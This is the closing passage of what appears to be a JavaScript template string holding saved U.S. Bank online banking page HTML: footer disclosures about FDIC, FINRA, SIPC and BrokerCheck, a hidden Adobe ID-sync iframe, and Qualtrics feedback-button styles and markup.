ZEAD/gEBkkCqHIijgXguEPds3LDhDbIaRiTFIkCqBIhzgPgREC8D4gQglgDiSUDcBdT8AawJqFgASJcBcR5UcRMQrwIq+AeUYwGyY4C4BohBhk4AYZAmkG5+IM4H4ikgxVicDNJcAcTNQPwRxDkFxK5AfAhq+gUgWx9Jz0GguANQ/AiUfxSkKQ2I7yMpmgH1Bww8QLM4moUBE0gBsRwS/we6ApCfFKA2eQPxNQbcwAKIlwOxILJNWxmIBAABBgBbjDZgSQ2mXAAAAABJRU5ErkJggg=="
                        />
                        Equal Housing Lender. Deposit products offered by U.S. Bank National Association. Member FDIC
                     </p>
                     <p class="content">U.S. Bank is not responsible for and does not guarantee the products, services or performance of U.S. Bancorp Advisors.</p>
                     </div>
                     <div class="greyColor mt-2rem">
                     <p aria-level="3" class="title fontBold" role="heading">For U.S. Bancorp Advisors:</p>
                     <p class="content">
                        Brokerage and investment advisory services offered by U.S. Bancorp Advisors LLC,
                        <span>
                           member
                           <button
                           aria-describedby="popupWindow"
                           aria-label="Financial Industry Regulatory Authority Opens in a popup"
                           aria-labelledby="finraDescription"
                           class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                           data-compn="@usb-shield/react-link"
                           data-compv="10.5.3"
                           data-libn="usb-shield"
                           data-libv="10.0.1"
                           data-testid="usb-link-usb-link-test-id"
                           id="ub-finra"
                           lang="en"
                           role="link"
                           type="button"
                           >
                           FINRA
                           </button>
                        </span>
                        <span>
                           and
                           <button
                           aria-describedby="popupWindow"
                           aria-label="Securities Investor Protection Corporation Opens in a popup"
                           aria-labelledby="sipcDescription"
                           class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                           data-compn="@usb-shield/react-link"
                           data-compv="10.5.3"
                           data-libn="usb-shield"
                           data-libv="10.0.1"
                           data-testid="usb-link-usb-link-test-id"
                           id="ub-sipc"
                           lang="en"
                           role="link"
                           type="button"
                           >
                           SIPC,
                           </button>
                        </span>
                        <span> an investment adviser and a brokerage subsidiary of U.S. Bancorp and affiliate of U.S. Bank. </span>
                     </p>
                     <p class="content">
                        U.S. Bancorp Advisors is registered with the Securities and Exchange Commission as both a broker-dealer and an investment adviser. To understand how brokerage and investment advisory services and fees differ,
                        <span>
                           the
                           <button
                           aria-describedby="new-window-footer"
                           aria-label="Client Relationship Summary Opens in a new tab"
                           class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                           data-compn="@usb-shield/react-link"
                           data-compv="10.5.3"
                           data-libn="usb-shield"
                           data-libv="10.0.1"
                           data-testid="usb-link-usb-link-test-id"
                           id="ub-crs"
                           lang="en"
                           role="link"
                           type="button"
                           >
                           Client Relationship Summary
                           </button>
                        </span>
                        <span>
                           and
                           <button
                           aria-describedby="new-window-footer"
                           aria-label="Regulation Best Interest Disclosure Opens in a new tab"
                           class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                           data-compn="@usb-shield/react-link"
                           data-compv="10.5.3"
                           data-libn="usb-shield"
                           data-libv="10.0.1"
                           data-testid="usb-link-usb-link-test-id"
                           id="ub-interestDisclosure"
                           lang="en"
                           role="link"
                           type="button"
                           >
                           Regulation Best Interest Disclosure
                           </button>
                        </span>
                        <span> are available for you to review. </span>
                     </p>
                     <p class="content">
                        The Financial Industry Regulatory Authority (FINRA) Rule 2267 provides for BrokerCheck to allow investors to learn about the professional background, business practices, and conduct of FINRA member firms or their brokers. To request such information, contact FINRA toll-free
                        1.800.289.9999 or via
                        <span>
                           <button
                           aria-describedby="popupWindow"
                           aria-label="BrokerCheck Opens in a popup"
                           class="usb-link basic usb-link_basic default-no-underline is-standard-style cta-style_standard is-underlined emphasis_subtle is-size-small size_small"
                           data-compn="@usb-shield/react-link"
                           data-compv="10.5.3"
                           data-libn="usb-shield"
                           data-libv="10.0.1"
                           data-testid="usb-link-usb-link-test-id"
                           id="ub-brokerCheck"
                           lang="en"
                           role="link"
                           type="button"
                           >
                           BrokerCheck
                           </button>
                        </span>
                        <span> website. An investor brochure describing BrokerCheck is also available through FINRA. </span>
                     </p>
                     </div>
                  </div>
               </div>
               </div>
            </footer>
         </div>
         <div class="chat-container" id="chat-container-div"></div>
         </div>
      </div>
      <div id="sec-overlay" style="display: none">
         <div id="sec-container"></div>
      </div>
      <iframe
      class="aamIframeLoaded"
      id="destination_publishing_iframe_usbank_0"
      name="destination_publishing_iframe_usbank_0_name"
      sandbox="allow-scripts allow-same-origin"
      src="https://usbank.demdex.net/dest5.html?d_nsid=0#https%3A%2F%2Fonlinebanking.usbank.com"
      style="display: none; width: 0px; height: 0px"
      title="Adobe ID Syncing iFrame"
    >
    </iframe>
    <div id="ZN_6VxkyqYWaF9f1T7"></div>
    <style type="text/css">
      .QSIFeedbackButton div,
      .QSIFeedbackButton dl,
      .QSIFeedbackButton dt,
      .QSIFeedbackButton dd,
      .QSIFeedbackButton ul,
      .QSIFeedbackButton ol,
      .QSIFeedbackButton li,
      .QSIFeedbackButton h1,
      .QSIFeedbackButton h2,
      .QSIFeedbackButton h3,
      .QSIFeedbackButton h4,
      .QSIFeedbackButton h5,
      .QSIFeedbackButton h6,
      .QSIFeedbackButton span,
      .QSIFeedbackButton pre,
      .QSIFeedbackButton form,
      .QSIFeedbackButton fieldset,
      .QSIFeedbackButton textarea,
      .QSIFeedbackButton p,
      .QSIFeedbackButton blockquote,
      .QSIFeedbackButton tr,
      .QSIFeedbackButton th,
      .QSIFeedbackButton td {
        margin: 0;
        padding: 0;
        background-color: transparent;
        border: 0;
        font-size: 12px;
        line-height: normal;
        vertical-align: baseline;
        box-shadow: none;
      }
      .QSIFeedbackButton img {
        height: auto;
        width: auto;
        margin: 0;
        padding: 0;
      }
      .QSIFeedbackButton ul,
      .QSIFeedbackButton ol {
        margin: 12px 0;
        padding-left: 40px;
      }
      .QSIFeedbackButton ul li {
        list-style-type: disc;
      }
      .QSIFeedbackButton ol li {
        list-style-type: decimal;
      }
      .QSIFeedbackButton .scrollable {
        -webkit-overflow-scrolling: touch;
      }
      .QSIFeedbackButton table {
        border-collapse: collapse;
        border-spacing: 0;
      }
      .QSIFeedbackButton table td {
        padding: 2px;
      }
      .QSIFeedbackButton iframe {
        max-height: none;
      }
      .QSIFeedbackButton * {
        box-sizing: content-box;
      }
    </style>
    <style type="text/css">
      
      @font-face {
        font-family: Circular-USB;
        src: url("https://content.usbank.com/content/dam/onlinebanking/common/static/fonts/U.S.BankCircularWeb-Light.woff2") format("woff2");
      }

      /* Style feedback button parent container. This is a container that sits on top of the entire screen and is mostly transparent that houses the feedback button */
      .QSIFeedbackButton {
        /* z-index: 1; */
        /* white-space: normal !important; */
      }

      /* Style feedback button */
      #QSIFeedbackButton-btn div {
        font-family:
          Circular-USB,
          Helvetica Neue,
          sans-serif;
      }

      /* Style survey iFrame container. This houses the iFrame and appears when clicking the feedback button */
      #QSIFeedbackButton-pullup-container.QSIFeedbackButton {
        /* display: inline-block !important; */
        /* margin-right: 5px !important; */
      }

      /* Style survey iFrame */
      #QSIFeedbackButton-survey-iframe {
        /* display: inline-block !important; */
        /* height: 100% !important; */
        /* width: 100% !important; */
      }
    </style>
    <div class="QSIFeedbackButton" style="position: fixed; visibility: hidden; inset: 0px; display: flex; flex-direction: column; justify-content: flex-end; align-items: flex-start; margin: 0px; padding: 0px; z-index: 2000000000">
      <button
        aria-controls="QSIFeedbackButton-target-container"
        aria-expanded="false"
        id="QSIFeedbackButton-btn"
        role="button"
        style="position: fixed; visibility: visible; cursor: pointer; border-width: medium; border-style: none; border-color: currentcolor; border-image: none; background-color: transparent; padding: 0px; margin: 0px; bottom: 231px; right: -1px; width: 35px; transition: 0.5s"
      >
        <div
          style="
            background: rgb(10, 65, 197);
            color: rgb(255, 255, 255);
            padding: 10px;
            position: relative;
            font-size: 15px;
            display: flex;
            flex-direction: row;
            z-index: -1;
            writing-mode: vertical-rl;
            text-orientation: sideways;
            transform: rotateZ(180deg);
            border-top-right-radius: 4px;
            border-bottom-right-radius: 4px;
          "
        >
          <div>
            <div></div>
          </div>
          <div>Give feedback</div>
        </div>
      </button>
    </div>
    <div
      aria-hidden="true"
      aria-labelledby="QSIFeedbackButton-btn"
      aria-modal="false"
      class="QSIFeedbackButton"
      id="QSIFeedbackButton-target-container"
      role="dialog"
      style="
        position: fixed;
        overflow: hidden;
        color: rgb(0, 0, 0);
        background-color: rgb(237, 237, 237);
        border-width: 2px medium 2px 2px;
        border-style: solid none solid solid;
        border-color: rgb(166, 166, 166) currentcolor rgb(166, 166, 166) rgb(166, 166, 166);
        border-image: none;
        box-sizing: border-box;
        transition: 0.5s;
        margin: 0px;
        padding: 0px;
        z-index: 2000000001;
        height: 75%;
        border-radius: 2px 0px 0px 2px;
        max-width: 400px;
        width: 100vw;
        left: 100%;
        bottom: 9px;
      "
    >
      <div id="QSIFeedbackButton-close-btn-container" style="background-color: transparent; padding-bottom: 10px; right: 10px; top: 10px; position: absolute; display: flex; justify-content: flex-end">
        <button id="QSIFeedbackButton-close-btn" role="button" style="cursor: pointer; border: 0px; padding: 0px; background-color: transparent; z-index: 2000000001; margin: 0px" tabindex="-1">
          <img
            alt="Close"
            src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACQAAAAkCAQAAABLCVATAAAAr0lEQVR42r3WSw6AIAwE0NlwStx7HG7ibbiOmEhId47jNJYd1hc/UIrsqOhoKFCioKGjAhE7TgwMHCgCc9z3nNjX1DaZRSnMpNZT9TkRlMDM0XFHwxCoYGK0uPCGItmcogxNEBiWpDI8kTOcYoxAPTAaRRiBIgyhCONQwXgUZ3zIfzX/Y//1+/0F6W8Rf9PmlxG/sOWXWr/4px1HaQdk8pFd/SYira2J2L43Wskt3wWzU90ySwFPkwAAAABJRU5ErkJggg=="
            style="height: 17px; width: 17px"
          />
        </button>
        <div id="QSIFeedbackButton-close-btn-background" style="position: absolute; width: 28px; height: 28px; border-radius: 14px; top: -5px; right: -5px; background-color: rgb(255, 255, 255); opacity: 0.5"></div>
      </div>
    </div>
   `
}